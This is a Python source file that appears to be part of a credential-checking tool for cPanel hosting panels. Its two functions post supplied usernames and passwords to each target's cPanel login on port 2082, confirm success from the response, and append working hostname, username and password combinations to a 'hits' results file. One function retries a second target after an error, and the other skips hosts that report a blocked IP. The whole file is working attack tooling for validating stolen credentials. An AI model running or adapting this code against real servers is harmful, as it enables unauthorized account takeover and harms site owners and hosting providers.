import requests


def checkcpanel_star(star, cpanel_username, cpanel_password):
    try:
        check = requests.get((star + '/cpanel'), verify=False)
        if check.status_code == 200:
            if '<a href="https://go.cpanel.net/privacy"' in check.text:
                login_data = {'user': cpanel_username,
                              'pass': cpanel_password,
                              'goto': '/'}
                inloggen = requests.post(f'{star}:2082/login/?login_only=1', data=login_data, verify=False)
                if 'redirect' in inloggen.text:
                    if 'security_token' in inloggen.text:
                        cpanel_hit = f"CPANEL_HOSTNAME= {star}\nCPANEL_USERNAME= {cpanel_username}\n" \
                                     f"CPANEL_PASSWORD= {cpanel_password}"
                        remover = cpanel_hit.replace('\r', '')
                        ssh = open("Results/CPANEL_INFO_HIT.txt", "a")
                        ssh.write(remover + '\n\n')
                        ssh.close()
                        return True
                    else:
                        return False
            else:
                return False
        else:
            return False
    except Exception as e:
        return False


def checkcpanel(star, cpanel_host, cpanel_username, cpanel_password):
    if cpanel_host.startswith("http://") or cpanel_host.startswith("https://"):
        cpanel_host = cpanel_host
    else:
        cpanel_host = f"http://{cpanel_host}"
    try:
        check = requests.get((cpanel_host + '/cpanel'), verify=False, timeout=3)
        if check.status_code == 200:
            if '<a href="https://go.cpanel.net/privacy"' in check.text:
                login_data = {'user': cpanel_username,
                              'pass': cpanel_password,
                              'goto': '/'}
                inloggen = requests.post(f'{cpanel_host}:2082/login/?login_only=1', data=login_data, verify=False,
                                         timeout=3)
                if "Your Ip is Blocked" in inloggen.text:
                    return False
                if 'redirect' in inloggen.text:
                    if 'security_token' in inloggen.text:
                        cpanel_hit = f"CPANEL_HOSTNAME= {cpanel_host}\nCPANEL_USERNAME= {cpanel_username}\n" \
                                     f"CPANEL_PASSWORD= {cpanel_password}"
                        remover = cpanel_hit.replace('\r', '')
                        ssh = open("Results/CPANEL_INFO_HIT.txt", "a")
                        ssh.write(remover + '\n\n')
                        ssh.close()
                        return True
                    else:
                        return False
            else:
                return False
        else:
            return False
    except Exception as e:
        try_second = checkcpanel_star(star, cpanel_username, cpanel_password)
        return try_second
